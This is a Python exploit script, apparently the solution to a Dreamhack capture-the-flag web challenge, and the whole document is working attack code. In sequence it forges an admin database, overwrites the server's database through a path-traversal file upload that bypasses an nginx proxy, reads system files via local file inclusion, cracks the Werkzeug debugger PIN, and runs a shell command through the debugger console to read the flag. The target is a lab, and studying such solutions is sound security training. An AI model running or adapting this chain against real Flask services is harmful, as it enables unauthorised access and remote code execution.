import requests
import socket
import re
import sqlite3
from urllib.parse import quote
import html
import os

host, port = 'host3.dreamhack.games', 17953
url = f"http://{host}:{port}"
s = requests.Session()

# for bypassing nginx proxy
def req(body, payload=None):
    req = b'\r\n'.join(body) + b'\r\n\r\n' + (payload or b'')
     
    s = socket.socket()
    s.connect((host, port))
    s.sendall(req)

    resp = b""

    while True:
        data = s.recv(4096)
        if not data:
            break
        resp += data

    s.close()

    return resp.decode()

# forge database.db
conn = sqlite3.connect('database.db')

conn.execute('DROP TABLE IF EXISTS users')
conn.execute('DROP TABLE IF EXISTS cats')

conn.execute("""
CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE NOT NULL,
    password TEXT NOT NULL,
    role TEXT DEFAULT 'user' CHECK(role IN ('admin', 'user'))
)
""")

conn.execute("""
CREATE TABLE IF NOT EXISTS cats (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name TEXT NOT NULL,
    owner TEXT NOT NULL,
    description TEXT NOT NULL,
    url TEXT NOT NULL,
    like INTEGER NOT NULL 
)
""")

admin_creds = {
    'username': 'admin',
    'password': 'hacked'
}

conn.execute('INSERT INTO users(username, password, role) VALUES (?, ?, ?)', (*admin_creds.values(), 'admin'))

conn.commit()
conn.close()

# ovewrite database.db
creds = {
    'username': 'hacked',
    'password': 'hacked'
}

res = s.post(f'{url}/register', data=creds)
res = s.post(f'{url}/login', data=creds)

assert 'welcome to' in res.text.lower()
print("> Logged in")

user_cookie = s.cookies['session']
print("> User cookie:", user_cookie)

with open("database.db", 'rb') as f:
    raw = requests.Request(
        "POST",
        f"{url}/dashboard?action=%75pload",
        files={
            "cat_image": ("../../database.db", f, "application/octet-stream")
        }
    )

    prepared = s.prepare_request(raw)

resp = req([
    b"POST /dashboard?action=%75pload HTTP/1.1",
    f"Host: {host}".encode(),
    f'Content-Type: {prepared.headers["Content-Type"]}'.encode(),
    f"Content-Length: {len(prepared.body)}".encode(),
    f'Cookie: session={user_cookie}'.encode(),
    b"Connection: close",
], prepared.body)

assert 'redirecting...' in resp.lower()
print("> Overwrote database")

os.remove('database.db')

# admin login
res = s.post(f'{url}/login', data=admin_creds)
assert 'welcome to' in res.text.lower()
print("> Logged in as admin")

admin_cookie = s.cookies['session']
print("> Admin cookie:", admin_cookie)

# lfi
def lfi(filename):
    payload = f'filename={filename}'.encode()

    resp = req([
        b"POST /admin\xA0 HTTP/1.1",
        f"Host: {host}".encode(),
        b"Content-Type: application/x-www-form-urlencoded",
        f"Content-Length: {len(payload)}".encode(),
        f'Cookie: session={admin_cookie}'.encode(),
        b"Connection: close",
    ], payload)

    assert 'file not found' not in resp.lower()

    contents = re.findall(r'<div class="file-content">(.+?)</div>', resp.replace('\n', ''))[0].strip()

    return contents

# crack debugger pin
import hashlib
from itertools import chain
import time

def hash_pin(pin: str) -> str:
    return hashlib.sha1(f"{pin} added salt".encode("utf-8", "replace")).hexdigest()[:12]

def crack(probably_public_bits, private_bits) -> tuple[str, str] | tuple[None, None]:
    rv = None
    num = None

    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode()
        h.update(bit)
    h.update(b"cookiesalt")

    cookie_name = f"__wzd{h.hexdigest()[:20]}"

    # If we need to generate a pin we salt it a bit more so that we don't
    # end up with the same value and generate out 9 digits
    if num is None:
        h.update(b"pinsalt")
        num = f"{int(h.hexdigest(), 16):09d}"[:9]

    # Format the pincode in groups of digits for easier remembering if
    # we don't have a result yet.
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = "-".join(
                    num[x : x + group_size].rjust(group_size, "0")
                    for x in range(0, len(num), group_size)
                )
                break
        else:
            rv = num

    return rv, f'{cookie_name}={int(time.time())}|{hash_pin(rv)}'

# get public and private bits
username = 'root'
filename = "/usr/local/lib/python3.11/site-packages/flask/app.py"

mac = lfi("/sys/class/net/eth0/address")
mac = str(int(mac.replace(':', ''), 16))

print("> Mac:", mac)

machine_id = lfi('/proc/sys/kernel/random/boot_id')
machine_id += lfi("/proc/self/cgroup").split('\n')[0].strip().rpartition("/")[2]

print("> Machine ID:", machine_id)

# crack pin
public = [username, 'flask.app', 'Flask', filename]
private = [mac, machine_id.encode()]

pin, cookie = crack(public, private)

print("> Pin:", pin)
print("> Cookie:", cookie)

# trigger error to get secret
resp = req([
    b"POST /dashboard?action=%75pload HTTP/1.1",
    f"Host: {host}".encode(),
    f'Cookie: session={user_cookie}'.encode(),
    b"Connection: close",
])

secret = re.findall(r'SECRET = "([0-9a-zA-Z]+)"', resp)[0].strip()

print("> Secret:", secret)

# initialise frame 0
resp = req([
    f"GET /console?x=1 HTTP/1.1".encode(),
    f"Host: 127.0.0.1".encode(),
    b"Connection: close",
])

# debugger rce
cmd = '''
__import__('os').popen('cat /flag*').read()
'''.strip()

resp = req([
    f"GET /console?__debugger__=%79es&frm=0&s={secret}&cmd={quote(cmd)} HTTP/1.1".encode(),
    f"Host: 127.0.0.1".encode(),
    f'Cookie: {cookie}'.encode(),
    b"Connection: close",
])

flag = re.findall(r'DH{.+}', html.unescape(resp))[0].strip()
print("Flag:", flag)